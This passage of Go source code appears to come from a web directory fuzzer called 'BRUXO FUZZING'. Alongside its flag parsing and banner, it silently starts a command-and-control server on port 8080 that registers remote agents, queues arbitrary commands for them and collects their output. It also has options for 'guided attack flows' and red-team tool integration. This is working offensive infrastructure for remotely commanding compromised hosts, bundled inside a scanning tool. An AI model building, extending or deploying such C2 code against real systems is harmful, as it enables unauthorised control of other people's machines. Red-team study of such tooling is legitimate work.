	flag.StringVar(&config.GroqAPIKey, "groq-api-key", os.Getenv("GROQ_API_KEY"), "Groq API Key for AI analysis")
	flag.BoolVar(&config.EnableAttackFlow, "attack-flow", false, "Enable guided attack flows for found vulnerabilities")
	flag.StringVar(&config.RedTeamToolURL, "red-team-tool-url", "", "URL of the Red Team tool API for integration")

	flag.Parse()

	if config.TargetURL == "" || config.WordlistPath == "" {
		fmt.Println("Target URL (-u) and wordlist (-w) are required.")
		flag.Usage()
		return
	}

	if config.GroqAPIKey == "" {
		fmt.Println(ColorYellow + "[WARNING] GROQ_API_KEY environment variable not set. AI analysis will be skipped." + ColorReset)
	}

	parseCodes := func(codes string) []int {
		var result []int
		if codes != "" {
			parts := strings.Split(codes, ",")
			for _, part := range parts {
				code, err := strconv.Atoi(strings.TrimSpace(part))
				if err == nil {
					result = append(result, code)
				}
			}
		}
		return result
	}

	config.ShowStatusCodes = parseCodes(showCodes)
	config.FilterStatusCodes = parseCodes(filterCodes)

	parseExtensions := func(exts string) []string {
		var result []string
		if exts != "" {
			parts := strings.Split(exts, ",")
			for _, part := range parts {
				result = append(result, strings.TrimSpace(part))
			}
		}
		return result
	}

	config.Extensions = parseExtensions(extensions)
	config.FilterExtensions = parseExtensions(filterExtensions)

	printBanner(config)
	engine := NewBruxoEngine(&config)
	go engine.startC2Server()
	if err := engine.Scan(); err != nil {
		engine.logger.Error("An error occurred during the scan: %v", err)
	}
}

func (b *BruxoEngine) startC2Server() {
	b.logger.Info("Starting C2 server on :8080")
	http.HandleFunc("/c2/checkin", b.handleCheckin)
	http.HandleFunc("/c2/tasks/", b.handleGetTask)
	http.HandleFunc("/c2/results/", b.handlePostResult)
	http.HandleFunc("/api/agents", b.handleGetAgents)
	http.HandleFunc("/api/agents/", b.handlePostTask)
	http.HandleFunc("/api/tasks/", b.handleGetTaskResult)

	if err := http.ListenAndServe(":8080", nil); err != nil {
		b.logger.Error("C2 server failed: %v", err)
	}
}

func (b *BruxoEngine) handleCheckin(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
		return
	}

	var agentData struct {
		Hostname string `json:"hostname"`
		OS       string `json:"os"`
	}

	if err := json.NewDecoder(r.Body).Decode(&agentData); err != nil {
		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}

	// Gerar um ID único para o agente
	agentID := fmt.Sprintf("agent-%d", time.Now().UnixNano())

	newAgent := &Agent{
		ID:        agentID,
		IPAddress: r.RemoteAddr,
		Hostname:  agentData.Hostname,
		OS:        agentData.OS,
		LastSeen:  time.Now(),
		Status:    "active",
		taskQueue: make(chan Task, 10), // Buffer para 10 tarefas
	}

	b.c2Mutex.Lock()
	b.c2Agents[agentID] = newAgent
	b.c2Mutex.Unlock()

	b.logger.Info("New agent checked in: %s from %s (%s)", agentID, newAgent.IPAddress, newAgent.OS)

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusCreated)
	json.NewEncoder(w).Encode(map[string]string{"id": agentID})
}

func (b *BruxoEngine) handleGetTask(w http.ResponseWriter, r *http.Request) {
	parts := strings.Split(r.URL.Path, "/")
	if len(parts) < 4 {
		http.Error(w, "Invalid URL path", http.StatusBadRequest)
		return
	}
	agentID := parts[2]

	b.c2Mutex.RLock()
	agent, ok := b.c2Agents[agentID]
	b.c2Mutex.RUnlock()

	if !ok {
		http.Error(w, "Agent not found", http.StatusNotFound)
		return
	}

	agent.LastSeen = time.Now()
	agent.Status = "active"

	select {
	case task := <-agent.taskQueue:
		b.logger.Info("Sending task %s to agent %s", task.ID, agentID)
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(task)
	case <-time.After(30 * time.Second): // Timeout para a resposta
		w.WriteHeader(http.StatusNoContent)
	}
}

func (b *BruxoEngine) handlePostResult(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
		return
	}

	parts := strings.Split(r.URL.Path, "/")
	if len(parts) < 4 {
		http.Error(w, "Invalid URL path", http.StatusBadRequest)
		return
	}
	agentID := parts[2]

	var data struct {
		TaskID string `json:"task_id"`
		Result string `json:"result"`
	}

	if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}

	b.c2Mutex.Lock()
	if task, ok := b.c2Tasks[data.TaskID]; ok {
		task.Result = data.Result
		task.Status = "completed"
		b.logger.Info("Result received for task %s from agent %s", data.TaskID, agentID)
		fmt.Printf("\n--- C2 RESULT (Task: %s, Agent: %s) ---\n%s\n-------------------------------------\n", data.TaskID, agentID, data.Result)
	} else {
		b.logger.Error("Received result for unknown task ID: %s", data.TaskID)
	}
	b.c2Mutex.Unlock()

	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(map[string]string{"status": "result processed"})
}

func (b *BruxoEngine) handleGetAgents(w http.ResponseWriter, r *http.Request) {
	// Lógica para o painel obter a lista de agentes
	b.c2Mutex.RLock()
	defer b.c2Mutex.RUnlock()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(b.c2Agents)
}

func (b *BruxoEngine) handlePostTask(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
		return
	}

	parts := strings.Split(r.URL.Path, "/")
	if len(parts) < 4 {
		http.Error(w, "Invalid URL path", http.StatusBadRequest)
		return
	}
	agentID := parts[2]

	var data struct {
		Command string `json:"command"`
	}

	if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}

	b.c2Mutex.RLock()
	agent, ok := b.c2Agents[agentID]
	b.c2Mutex.RUnlock()

	if !ok {
		http.Error(w, "Agent not found", http.StatusNotFound)
		return
	}

	task := Task{
		ID:      fmt.Sprintf("task-%d", time.Now().UnixNano()),
		Command: data.Command,
		Status:  "pending",
	}

	b.c2Mutex.Lock()
	b.c2Tasks[task.ID] = &task
	b.c2Mutex.Unlock()

	select {
	case agent.taskQueue <- task:
		b.logger.Info("Task %s enqueued for agent %s: %s", task.ID, agentID, task.Command)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusAccepted)
		json.NewEncoder(w).Encode(task)
	default:
		b.logger.Error("Task queue for agent %s is full", agentID)
		http.Error(w, "Task queue is full", http.StatusServiceUnavailable)
	}
}

func (b *BruxoEngine) handleGetTaskResult(w http.ResponseWriter, r *http.Request) {
	parts := strings.Split(r.URL.Path, "/")
	if len(parts) < 4 {
		http.Error(w, "Invalid URL path", http.StatusBadRequest)
		return
	}
	taskID := parts[2]

	b.c2Mutex.RLock()
	task, ok := b.c2Tasks[taskID]
	b.c2Mutex.RUnlock()

	if !ok {
		http.Error(w, "Task not found", http.StatusNotFound)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(task)
}

func printBanner(config Config) {
	banner := `
██████╗░██████╗░██╗░░░██╗██╗░░██╗░█████╗░
██╔══██╗██╔══██╗██║░░░██║╚██╗██╔╝██╔══██╗
██████╦╝██████╔╝██║░░░██║░╚███╔╝░██║░░██║
██╔══██╗██╔══██╗██║░░░██║░██╔██╗░██║░░██║
██████╦╝██║░░██║╚██████╔╝██╔╝╚██╗╚█████╔╝
╚═════╝░╚═╝░░╚═╝░╚═════╝░╚═╝░░╚═╝░╚════╝░
`
	fmt.Println(ColorPurple + banner + ColorReset)
	fmt.Printf("       %sSpeed is magic — by Dione, Brazil%s \n", ColorWhite, ColorReset)
	fmt.Printf("          %sBRUXO FUZZING v1.0%s\n\n", Bold, ColorReset)
	fmt.Printf(" %s🚩 Target          : %s%s\n", ColorCyan, ColorReset, config.TargetURL)
	fmt.Printf(" %s📂 Wordlist        : %s%s\n", ColorCyan, ColorReset, config.WordlistPath)
	fmt.Printf(" %s💀 Threads         : %s%d\n", ColorCyan, ColorReset, config.NumThreads)
	fmt.Printf(" %s⏱️  Rate Limit      : %s%d/s\n", ColorCyan, ColorReset, config.RateLimit)
	fmt.Printf(" %s👾 Filter (-fx)    : %s%v\n", ColorCyan, ColorReset, config.FilterExtensions)
	fmt.Printf("%s%s%s\n", ColorPurple, strings.Repeat("-", 60), ColorReset)
}
